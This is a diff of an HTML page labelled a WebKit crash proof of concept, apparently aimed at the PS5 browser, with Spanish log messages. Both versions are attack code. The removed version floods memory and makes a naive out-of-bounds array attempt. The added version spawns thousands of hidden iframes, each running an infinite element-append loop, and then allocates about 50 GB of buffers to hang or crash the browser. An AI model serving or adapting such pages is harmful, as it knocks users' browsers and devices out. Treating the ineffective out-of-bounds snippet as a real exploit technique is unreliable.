@@ -1,86 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>💥 PS5 Nuke + OOB test</title>
+  <title>WebKit Crash PoC</title>
   <style>
     body {
-      background: black;
-      color: lime;
+      background: #111;
+      color: #0f0;
       font-family: monospace;
     }
   </style>
 </head>
 <body>
-  <h1>💥 PS5 Nuke + OOB test</h1>
-  <p>Ejecutando técnicas agresivas + corrupción Out-Of-Bounds tentativa</p>
-  <pre id="log"></pre>
+  <h1>Ejecutando PoC agresivo WebKit...</h1>
+  <pre id="log">Inicializando...</pre>
 
   <script>
-    const log = document.getElementById("log");
-    function print(msg) {
-      console.log(msg);
-      log.textContent += msg + "\n";
-    }
+    const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-    // Convierte float64 <-> int64 (64bit)
-    const buf = new ArrayBuffer(8);
-    const f64 = new Float64Array(buf);
-    const u32 = new Uint32Array(buf);
+    try {
+      log("Iniciando test de corrupción de capa de renderizado...");
 
-    function f2i(f) {
-      f64[0] = f;
-      return u32[0] + u32[1] * 0x100000000;
-    }
-
-    function i2f(i) {
-      u32[0] = i % 0x100000000;
-      u32[1] = i / 0x100000000;
-      return f64[0];
-    }
-
-    // 1. Saturar la memoria para preparar heap
-    function memoryFlood() {
-      const big = [];
-      try {
-        while (true) {
-          big.push(new Uint8Array(50_000_000));
-          if (big.length % 10 === 0) print(`💣 Memoria saturada: ${big.length * 50}MB aprox`);
-        }
-      } catch (e) {
-        print("💥 Memoria saturada capturada: " + e);
-      }
-      return big;
-    }
-
-    // 2. Corrupción OOB tentativa en array
-    function corruptArrayOOB() {
-      print("[*] Intentando corrupción OOB");
-      let arr = [1.1, 2.2, 3.3];
-      try {
-        Object.defineProperty(arr, 'length', { value: 0x100 });
-        print("[+] Corrupt length a 0x100");
-      } catch (e) {
-        print("[-] No se pudo corromper length: " + e);
+      for (let i = 0; i < 10000; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.srcdoc = `<script>while(1)document.body.appendChild(document.createElement('div'))<\/script>`;
+        iframe.style.position = "absolute";
+        iframe.style.top = "-9999px";
+        document.body.appendChild(iframe);
+        if (i % 100 === 0) log("Iteración " + i);
       }
 
-      try {
-        let leak = arr[0x80];
-        print("[+] Leak OOB en arr[0x80]: " + leak);
-      } catch (e) {
-        print("[-] No se pudo leer fuera de límites: " + e);
+      log("Probando animaciones y transformaciones pesadas...");
+
+      for (let i = 0; i < 10000; i++) {
+        let div = document.createElement("div");
+        div.style.width = div.style.height = "100px";
+        div.style.background = "#0f0";
+        div.style.position = "absolute";
+        div.style.top = `${Math.random() * 1000}px`;
+        div.style.left = `${Math.random() * 1000}px`;
+        div.style.transform = `scale(${Math.random() * 10}) rotate(${Math.random() * 360}deg)`;
+        div.style.transition = "all 0.1s linear";
+        document.body.appendChild(div);
       }
-    }
 
-    // Base agresiva (simplificada, solo memoria)
-    function aggressiveBase() {
-      memoryFlood();
-      corruptArrayOOB();
-    }
+      log("Forzando liberación de memoria...");
 
-    window.onload = () => {
-      setTimeout(aggressiveBase, 10);
-    };
+      let arr = [];
+      for (let i = 0; i < 50000; i++) {
+        arr.push(new ArrayBuffer(1024 * 1024)); // 1MB por entrada
+        if (i % 1000 === 0) log("Buffering " + i + "MB");
+      }
+
+      log("Test completado. Si no se colgó, el navegador es resistente.");
+    } catch (e) {
+      log("Excepción: " + e.toString());
+    }
   </script>
 </body>
 </html>
